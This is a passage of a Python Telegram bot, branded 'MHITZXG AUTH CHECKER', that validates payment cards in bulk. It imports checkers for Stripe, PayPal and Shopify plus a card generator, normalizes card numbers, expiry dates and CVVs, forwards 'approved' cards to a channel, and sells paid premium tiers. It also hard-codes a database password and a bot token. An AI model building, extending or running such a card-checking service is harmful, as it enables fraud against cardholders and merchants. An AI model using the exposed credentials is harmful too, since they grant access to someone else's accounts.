from gen import CardGenerator
import telebot
from flask import Flask
import threading
import re
import os
import io
import time
import json
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
from p import check_card
from ch import check_card_stripe, check_cards_stripe
from st import check_single_cc, check_mass_cc, test_charge
from payp import check_card_paypal  
from sh import check_card_shopify, check_cards_shopify
import mysql.connector
from mysql.connector import pooling

# Database connection pool
db_pool = pooling.MySQLConnectionPool(
    pool_name="bot_pool",
    pool_size=5,
    pool_reset_session=True,
    host="sql12.freesqldatabase.com",
    user="sql12802422",
    password="JJ3hSnN2aC",
    database="sql12802422",
    port=3306,
    autocommit=True
)

# Database connection function with connection pooling
def connect_db():
    try:
        return db_pool.get_connection()
    except mysql.connector.Error as err:
        print(f"Database connection error: {err}")
        return None

# Add this function to send notifications to admin
def notify_admin(message):
    """Send notification to main admin"""
    try:
        send_long_message(MAIN_ADMIN_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send admin notification: {e}")

# Add this function to send approved cards to channel
def notify_channel(message):
    """Send approved card to channel with length checking"""
    try:
        send_long_message(CHANNEL_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send channel notification: {e}")

# Cache for frequently accessed data
user_cache = {}
cache_timeout = 300  # 5 minutes

# Helper function to handle long messages
def send_long_message(chat_id, text, parse_mode=None, reply_to_message_id=None):
    """Send long messages by splitting them into multiple parts if needed"""
    MAX_MESSAGE_LENGTH = 4096
    
    if len(text) <= MAX_MESSAGE_LENGTH:
        # Message is within limit, send normally
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
    
    # Split message into parts
    messages = []
    lines = text.split('\n')
    current_message = ""
    
    for line in lines:
        # Check if adding this line would exceed the limit
        if len(current_message) + len(line) + 1 > MAX_MESSAGE_LENGTH:
            # If current message has content, add it to messages
            if current_message:
                messages.append(current_message)
                current_message = ""
            
            # If a single line is too long, split it
            if len(line) > MAX_MESSAGE_LENGTH:
                # Split the long line into chunks
                chunks = [line[i:i+MAX_MESSAGE_LENGTH] for i in range(0, len(line), MAX_MESSAGE_LENGTH)]
                for chunk in chunks[:-1]:
                    messages.append(chunk)
                current_message = chunks[-1]
            else:
                current_message = line
        else:
            if current_message:
                current_message += '\n' + line
            else:
                current_message = line
    
    # Add the last message if any
    if current_message:
        messages.append(current_message)
    
    # Send all messages
    sent_messages = []
    for i, message_text in enumerate(messages):
        try:
            if i == 0 and reply_to_message_id:
                msg = bot.send_message(chat_id, message_text, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
            else:
                msg = bot.send_message(chat_id, message_text, parse_mode=parse_mode)
            sent_messages.append(msg)
        except Exception as e:
            print(f"Error sending message part {i}: {e}")
    
    return sent_messages

def edit_long_message(chat_id, message_id, text, parse_mode=None):
    """Edit long messages by splitting them into multiple parts if needed"""
    MAX_MESSAGE_LENGTH = 4096
    
    if len(text) <= MAX_MESSAGE_LENGTH:
        # Message is within limit, edit normally
        try:
            return bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode)
        except Exception as e:
            print(f"Error editing message: {e}")
            return None
    
    # For long messages, we need to delete the original and send new ones
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    
    return send_long_message(chat_id, text, parse_mode=parse_mode)

# Stats tracking functions
def update_stats(approved=0, declined=0):
    """Update global statistics in database"""
    try:
        conn = connect_db()
        if not conn:
            return
            
        cursor = conn.cursor()
        
        # Update bot_stats table
        cursor.execute("""
            UPDATE bot_stats 
            SET total_cards_checked = total_cards_checked + %s,
                total_approved_cards = total_approved_cards + %s,
                total_declined_cards = total_declined_cards + %s
            WHERE id = 1
        """, (approved + declined, approved, declined))
        
        # Update daily_stats table
        cursor.execute("""
            INSERT INTO daily_stats (date, cards_checked, approved_cards, declined_cards, total_users)
            VALUES (CURDATE(), %s, %s, %s, %s)
            ON DUPLICATE KEY UPDATE 
                cards_checked = cards_checked + VALUES(cards_checked),
                approved_cards = approved_cards + VALUES(approved_cards),
                declined_cards = declined_cards + VALUES(declined_cards),
                total_users = VALUES(total_users)
        """, (approved + declined, approved, declined, get_total_users()))
        
        conn.commit()
        
    except Exception as e:
        print(f"Error updating stats: {e}")
    finally:
        if conn and conn.is_connected():
            conn.close()

def update_user_stats(user_id, approved=False):
    """Update user statistics"""
    try:
        conn = connect_db()
        if not conn:
            return
            
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO user_stats (user_id, total_checks, approved_checks, declined_checks, last_used)
            VALUES (%s, 1, %s, %s, NOW())
            ON DUPLICATE KEY UPDATE 
                total_checks = total_checks + 1,
                approved_checks = approved_checks + %s,
                declined_checks = declined_checks + %s,
                last_used = NOW()
        """, (user_id, 1 if approved else 0, 0 if approved else 1, 1 if approved else 0, 0 if approved else 1))
        
        conn.commit()
        
    except Exception as e:
        print(f"Error updating user stats: {e}")
    finally:
        if conn and conn.is_connected():
            conn.close()

def get_stats_from_db():
    """Get statistics from database"""
    try:
        conn = connect_db()
        if not conn:
            return None
            
        cursor = conn.cursor(dictionary=True)
        
        # Get overall stats
        cursor.execute("SELECT * FROM bot_stats WHERE id = 1")
        bot_stats = cursor.fetchone()
        
        # Get today's stats
        cursor.execute("SELECT * FROM daily_stats WHERE date = CURDATE()")
        daily_stats = cursor.fetchone()
        
        # Get total users
        total_users = get_total_users()
        
        return {
            'total_cards': bot_stats['total_cards_checked'] if bot_stats else 0,
            'total_approved': bot_stats['total_approved_cards'] if bot_stats else 0,
            'total_declined': bot_stats['total_declined_cards'] if bot_stats else 0,
            'today_cards': daily_stats['cards_checked'] if daily_stats else 0,
            'today_approved': daily_stats['approved_cards'] if daily_stats else 0,
            'today_declined': daily_stats['declined_cards'] if daily_stats else 0,
            'total_users': total_users
        }
        
    except Exception as e:
        print(f"Error getting stats from DB: {e}")
        return None
    finally:
        if conn and conn.is_connected():
            conn.close()

def get_total_users():
    """Get total number of users from database"""
    cache_key = "total_users"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    try:
        conn = connect_db()
        if not conn:
            return 0
            
        cursor = conn.cursor()
        
        # Count free users
        cursor.execute("SELECT COUNT(*) FROM free_users")
        free_count = cursor.fetchone()[0]
        
        # Count premium users
        cursor.execute("SELECT COUNT(*) FROM premium_users WHERE subscription_expiry > NOW()")
        premium_count = cursor.fetchone()[0]
        
        total = free_count + premium_count
        
        # Cache the result
        user_cache[cache_key] = {'result': total, 'time': time.time()}
        return total
        
    except Exception as e:
        print(f"Error getting total users: {e}")
        return 0
    finally:
        if conn and conn.is_connected():
            conn.close()

def add_free_user(user_id, first_name):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT IGNORE INTO free_users (user_id, first_name) VALUES (%s, %s)",
            (user_id, first_name)
        )
        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error adding free user: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def store_key(key, validity_days):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO premium_keys (`key`, validity_days) VALUES (%s, %s)",
            (key, validity_days)
        )
        conn.commit()
        return True
    except Exception as e:
        print(f"Error storing key: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def is_key_valid(key):
    conn = connect_db()
    if not conn:
        return None
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute(
            "SELECT * FROM premium_keys WHERE `key` = %s AND used_by IS NULL",
            (key,)
        )
        result = cursor.fetchone()
        return result
    except Exception as e:
        print(f"Error checking key validity: {e}")
        return None
    finally:
        if conn.is_connected():
            conn.close()

def mark_key_as_used(key, user_id):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE premium_keys SET used_by = %s, used_at = NOW() WHERE `key` = %s",
            (user_id, key)
        )
        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error marking key as used: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def add_premium(user_id, first_name, validity_days):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        expiry_date = datetime.now() + timedelta(days=validity_days)

        cursor.execute("""
            INSERT INTO premium_users (user_id, first_name, subscription_expiry)
            VALUES (%s, %s, %s)
            ON DUPLICATE KEY UPDATE
                first_name = VALUES(first_name),
                subscription_start = CURRENT_TIMESTAMP,
                subscription_expiry = VALUES(subscription_expiry)
        """, (user_id, first_name, expiry_date))

        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error adding premium user: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def is_premium(user_id):
    """Check if user has premium subscription"""
    # Admins are always premium
    if is_admin(user_id):
        return True
    
    # Check cache first
    cache_key = f"premium_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    # Check premium_users table
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()

        premium_result = False
        if result:
            expiry = result['subscription_expiry']
            if expiry is None:
                premium_result = False
            else:
                # Convert to datetime object if it's a string
                if isinstance(expiry, str):
                    expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                premium_result = expiry > datetime.now()
        
        # Cache the result
        user_cache[cache_key] = {'result': premium_result, 'time': time.time()}
        return premium_result
    except Exception as e:
        print(f"Error checking premium status: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

card_generator = CardGenerator()

# BOT Configuration
BOT_TOKEN = '8374941881:AAGI8cU4W85SEN0WbEvg_eTZiGZdvXAmVCk'
MAIN_ADMIN_ID = 5103348494
CHANNEL_ID = 5103348494  # Your channel ID

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=10)

FREE_USER_COOLDOWN = {}  # For anti-spam system

# ---------------- Helper Functions ---------------- #

def load_admins():
    """Load admin list from database"""
    cache_key = "admins_list"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    try:
        conn = connect_db()
        if not conn:
            return [MAIN_ADMIN_ID]
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM admins")
        admins = [row[0] for row in cursor.fetchall()]
        # Cache the result
        user_cache[cache_key] = {'result': admins, 'time': time.time()}
        return admins
    except Exception as e:
        print(f"Error loading admins: {e}")
        return [MAIN_ADMIN_ID]
    finally:
        if conn and conn.is_connected():
            conn.close()

def save_admins(admins):
    """Save admin list to database"""
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        
        # Clear existing admins
        cursor.execute("DELETE FROM admins")
        
        # Insert new admins
        for admin_id in admins:
            cursor.execute("INSERT INTO admins (user_id) VALUES (%s)", (admin_id,))
        
        conn.commit()
        # Clear cache
        if "admins_list" in user_cache:
            del user_cache["admins_list"]
        return True
    except Exception as e:
        print(f"Error saving admins: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def is_admin(user_id):
    """Check if user is an admin"""
    # Convert to int for comparison
    try:
        user_id_int = int(user_id)
    except (ValueError, TypeError):
        return False
        
    # Always check MAIN_ADMIN_ID first
    if user_id_int == MAIN_ADMIN_ID:
        return True
        
    admins = load_admins()
    return user_id_int in admins

def is_authorized(msg):
    """Check if user is authorized"""
    user_id = msg.from_user.id
    chat = msg.chat

    # ✅ Allow all admins anywhere
    if is_admin(user_id):
        return True

    # ✅ Allow all premium users
    if is_premium(user_id):
        return True

    # ✅ If message is from group and group is authorized
    if chat.type in ["group", "supergroup"]:
        return is_group_authorized(chat.id)

    # ✅ If private chat, check if user is in free_users table
    if chat.type == "private":
        # Check cache first
        cache_key = f"free_user_{user_id}"
        if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
            return user_cache[cache_key]['result']
            
        conn = connect_db()
        if not conn:
            return False
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
            result = cursor.fetchone()
            # Cache the result
            user_cache[cache_key] = {'result': result is not None, 'time': time.time()}
            return result is not None
        except Exception as e:
            print(f"Error checking free user: {e}")
            return False
        finally:
            if conn.is_connected():
                conn.close()

    return False

def normalize_card(text):
    """
    Normalize credit card from any format to cc|mm|yy|cvv
    Similar to PHP normalize_card function
    """
    if not text:
        return None

    # Replace newlines and slashes with spaces
    text = text.replace('\n', ' ').replace('/', ' ')

    # Find all numbers in the text
    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for part in numbers:
        if len(part) == 16:  # Credit card number
            cc = part
        elif len(part) == 4 and part.startswith('20'):  # 4-digit year starting with 20
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':  # Month (2 digits <= 12)
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':  # 2-digit year
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':  # CVV (3-4 digits)
            cvv = part

    # Check if we have all required parts
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"

    return None

def get_user_info(user_id):
    """Get user info for display in responses"""
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"User {user_id}"
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        # Check admin status first, before other checks
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            # Check if user is in free_users table
            conn = connect_db()
            if not conn:
                user_type = "Unknown User ❓"
            else:
                try:
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
                    free_user = cursor.fetchone()
                    
                    if free_user:
                        user_type = "Free User 🔓"
                    else:
                        user_type = "Unauthorized User ❌"
                except Exception as e:
                    print(f"Error checking user type: {e}")
                    user_type = "Unknown User ❓"
                finally:
                    if conn.is_connected():
                        conn.close()
                
        return {
            "username": username,
            "full_name": full_name,
            "user_type": user_type,
            "user_id": user_id
        }
        
    except:
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            user_type = "Unknown User ❓"
                
        return {
            "username": f"User {user_id}",
            "full_name": f"User {user_id}",
            "user_type": user_type,
            "user_id": user_id
        }

def check_proxy_status():
    """Check if proxy is live or dead"""
    try:
        # Simple check by trying to access a reliable site
        import requests
        test_url = "https://www.google.com"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            return "Live ✅"
        else:
            return "Dead ❌"
    except:
        return "Dead ❌"

def get_subscription_info(user_id):
    """Get subscription information for a user"""
    if is_admin(user_id):
        return ("Unlimited ♾️", "Never")
    
    # Check premium_users table
    conn = connect_db()
    if not conn:
        return ("Error ❌", "N/A")
        
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
        result_db = cursor.fetchone()

        if result_db:
            expiry = result_db['subscription_expiry']
            if expiry is None:
                return ("No subscription ❌", "N/A")
            else:
                # Convert to datetime object if it's a string
                if isinstance(expiry, str):
                    expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                
                remaining_days = (expiry - datetime.now()).days
                if remaining_days < 0:
                    return ("Expired ❌", expiry.strftime("%Y-%m-%d %H:%M:%S"))
                else:
                    return (f"{remaining_days} days", expiry.strftime("%Y-%m-%d %H:%M:%S"))
        else:
            return ("No subscription ❌", "N/A")
    except Exception as e:
        print(f"Error getting subscription info: {e}")
        return ("Error ❌", "N/A")
    finally:
        if conn.is_connected():
            conn.close()

def check_cooldown(user_id, command_type):
    """Check if user is in cooldown period"""
    current_time = time.time()
    user_id_str = str(user_id)
    
    # Admins and premium users have no cooldown
    if is_admin(user_id) or is_premium(user_id):
        return False
        
    # Check if user is in cooldown
    if user_id_str in FREE_USER_COOLDOWN:
        if command_type in FREE_USER_COOLDOWN[user_id_str]:
            if current_time < FREE_USER_COOLDOWN[user_id_str][command_type]:
                return True
    
    return False

def set_cooldown(user_id, command_type, duration):
    """Set cooldown for a user"""
    user_id_str = str(user_id)
    
    # Don't set cooldown for admins and premium users
    if is_admin(user_id) or is_premium(user_id):
        return
    
    if user_id_str not in FREE_USER_COOLDOWN:
        FREE_USER_COOLDOWN[user_id_str] = {}
    
    FREE_USER_COOLDOWN[user_id_str][command_type] = time.time() + duration

# For groups
GROUPS_FILE = 'authorized_groups.json'

def load_authorized_groups():
    if not os.path.exists(GROUPS_FILE):
        return []
    try:
        with open(GROUPS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_authorized_groups(groups):
    try:
        with open(GROUPS_FILE, 'w') as f:
            json.dump(groups, f)
    except Exception as e:
        print(f"Error saving authorized groups: {e}")

def is_group_authorized(group_id):
    return group_id in load_authorized_groups()

# ---------------- Status Command ---------------- #

@bot.message_handler(commands=['status'])
def status_command(msg):
    """Show bot statistics and status"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can view status

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Get statistics from database
    stats = get_stats_from_db()
    
    if not stats:
        return send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Cannot retrieve statistics from database
• Please try again later""", reply_to_message_id=msg.message_id)

    # Calculate approval rates
    total_approval_rate = (stats['total_approved'] / stats['total_cards'] * 100) if stats['total_cards'] > 0 else 0
    today_approval_rate = (stats['today_approved'] / stats['today_cards'] * 100) if stats['today_cards'] > 0 else 0
    
    # Get proxy status
    proxy_status = check_proxy_status()
    
    # Get current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    status_message = f"""
╔═══════════════════════╗
        📊 BOT STATUS 📊
╚═══════════════════════╝

🤖 BOT INFORMATION:
• Bot Name: MHITZXG AUTH CHECKER
• Status: Online ✅
• Proxy: {proxy_status}
• Last Update: {current_time}

📈 OVERALL STATISTICS:
• Total Cards Checked: {stats['total_cards']}
• Approved Cards: {stats['total_approved']} ✅
• Declined Cards: {stats['total_declined']} ❌
• Approval Rate: {total_approval_rate:.2f}%

📅 TODAY'S STATISTICS:
• Cards Checked: {stats['today_cards']}
• Approved: {stats['today_approved']} ✅
• Declined: {stats['today_declined']} ❌
• Approval Rate: {today_approval_rate:.2f}%

👥 USER INFORMATION:
• Total Users: {stats['total_users']}
• Free Users: {stats['total_users'] - len(load_admins())} 🔓
• Premium Users: {len(load_admins())} 💰

⚡ SYSTEM STATUS:
• Database: Connected ✅
• API: Operational ✅
• Gateway: Active ✅

🔱 Powered by: @mhitzxg & @pr0xy_xd
"""

    send_long_message(msg.chat.id, status_message, reply_to_message_id=msg.message_id)

# ---------------- Admin Commands ---------------- #
@bot.message_handler(commands=['addadmin'])
def add_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can add other admins
• Contact the main admin: @mhitzxg""", reply_to_message_id=msg.message_id)
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/addadmin <user_id>`
• Example: `/addadmin 1234567890`""", reply_to_message_id=msg.message_id)
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id in admins:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ❌ ALREADY ADMIN ❌
╚═══════════════════════╝

• This user is already an admin""", reply_to_message_id=msg.message_id)
        
        admins.append(user_id)
        if save_admins(admins):
            send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
     ✅ ADMIN ADDED ✅
╚═══════════════════════╝

• Successfully added `{user_id}` as admin
• Total admins: {len(admins)}""", reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to save admin to database""", reply_to_message_id=msg.message_id)
        
    except ValueError:
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/addadmin 1234567890`""", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""", reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
      🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can remove other admins
• Contact the main admin: @mhitzxg""", reply_to_message_id=msg.message_id)
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/removeadmin <user_id>`
• Example: `/removeadmin 12734567890`""", reply_to_message_id=msg.message_id)
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id == MAIN_ADMIN_ID:
            return send_long_message(msg.chat.id, """
  ╔═══════════════════════╗
❌ CANNOT REMOVE MAIN ADMIN ❌
  ╚═══════════════════════╝
 
• You cannot remove the main admin""", reply_to_message_id=msg.message_id)
        
        if user_id not in admins:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ❌ NOT AN ADMIN ❌
╚═══════════════════════╝

• This user is not an admin""", reply_to_message_id=msg.message_id)
        
        admins.remove(user_id)
        if save_admins(admins):
            send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
 ✅ ADMIN REMOVED ✅
╚═══════════════════════╝

• Successfully removed `{user_id}` from admins
• Total admins: {len(admins)}""", reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to save admin changes to database""", reply_to_message_id=msg.message_id)
        
    except ValueError:
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
 ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/removeadmin 1234567890`""", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"""
╔══════════════════════╗
    ⚠️ ERROR ⚠️
╚══════════════════════╝

• Error: {str(e)}""", reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['unauth'])
def unauth_user(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can unauthorize users
• Contact an admin for assistance""", reply_to_message_id=msg.message_id)
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/unauth <user_id>`
• Example: `/unauth 1234567890`""", reply_to_message_id=msg.message_id)
        
        user_id = int(parts[1])
        
        # Remove user from free_users table
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Cannot connect to database""", reply_to_message_id=msg.message_id)
            
        cursor = conn.cursor()
        cursor.execute("DELETE FROM free_users WHERE user_id = %s", (user_id,))
        conn.commit()
        
        if cursor.rowcount > 0:
            # Clear cache
            cache_key = f"free_user_{user_id}"
            if cache_key in user_cache:
                del user_cache[cache_key]
                
            send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
   ✅ USER UNAUTHORIZED ✅
╚═══════════════════════╝

• Successfully removed authorization for user: `{user_id}`
• User can no longer use the bot in private chats""", reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
  ❌ USER NOT FOUND ❌
╚═══════════════════════╝

• User `{user_id}` was not found in the authorized users list
• No action taken""", reply_to_message_id=msg.message_id)
        
    except ValueError:
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/unauth 1234567890`""", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""", reply_to_message_id=msg.message_id)
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['listfree'])
def list_free_users(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can view the free users list
• Contact an admin for assistance""", reply_to_message_id=msg.message_id)
    
    try:
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Cannot connect to database""", reply_to_message_id=msg.message_id)
            
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, first_name FROM free_users ORDER BY user_id")
        free_users = cursor.fetchall()
        
        if not free_users:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
   📋 NO FREE USERS 📋
╚═══════════════════════╝

• There are no authorized free users""", reply_to_message_id=msg.message_id)
        
        user_list = ""
        for user_id, first_name in free_users:
            user_list += f"• `{user_id}` - {first_name}\n"
        
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
   📋 FREE USERS LIST 📋
╚═══════════════════════╝

{user_list}
• Total free users: {len(free_users)}""", reply_to_message_id=msg.message_id)
        
    except Exception as e:
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""", reply_to_message_id=msg.message_id)
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['listadmins'])
def list_admins(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can view the admin list
• Contact an admin to get access""", reply_to_message_id=msg.message_id)
    
    admins = load_admins()
    if not admins:
        return send_long_message(msg.chat.id, """
╔═══════════════════════╗
   ❌ NO ADMINS ❌
╚═══════════════════════╝

• There are no admins configured""", reply_to_message_id=msg.message_id)
    
    admin_list = ""
    for i, admin_id in enumerate(admins, 1):
        if admin_id == MAIN_ADMIN_ID:
            admin_list += f"• `{admin_id}` (Main Admin) 👑\n"
        else:
            admin_list += f"• `{admin_id}`\n"
    
    send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
   📋 ADMIN LIST 📋
╚═══════════════════════╝

{admin_list}
• Total admins: {len(admins)}""", reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['authgroup'])
def authorize_group(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can authorize groups""", reply_to_message_id=msg.message_id)

    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/authgroup <group_id>`
• Example: `/authgroup -1001234567890`""", reply_to_message_id=msg.message_id)

        group_id = int(parts[1])
        groups = load_authorized_groups()

        if group_id in groups:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
✅ ALREADY AUTHORIZED ✅
╚═══════════════════════╝

• This group is already authorized""", reply_to_message_id=msg.message_id)

        groups.append(group_id)
        save_authorized_groups(groups)
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
 ✅ GROUP AUTHORIZED ✅
╚═══════════════════════╝

• Successfully authorized group: `{group_id}`
• Total authorized groups: {len(groups)}""", reply_to_message_id=msg.message_id)

    except ValueError:
        send_long_message(msg.chat.id, """

 ❌ INVALID GROUP ID ❌


• Please provide a valid numeric group ID""", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"""

     ⚠️ ERROR ⚠️


• Error: {str(e)}""", reply_to_message_id=msg.message_id)

# ---------------- Subscription Commands ---------------- #

@bot.message_handler(commands=['subscription'])
def subscription_info(msg):
    """Show subscription plans"""
    user_id = msg.from_user.id
    
    if is_admin(user_id):
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
 💎 SUBSCRIPTION INFO 💎
╚═══════════════════════╝

• You are the Premium Owner of this bot 👑
• Expiry: Unlimited ♾️
• Enjoy unlimited card checks 🛒

╔═══════════════════════╗
 💰 PREMIUM FEATURES 💰
╚═══════════════════════╝
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀
• No limitations ✅

📋 Premium Plans:
• 7 days - $3 💵
• 30 days - $10 💵
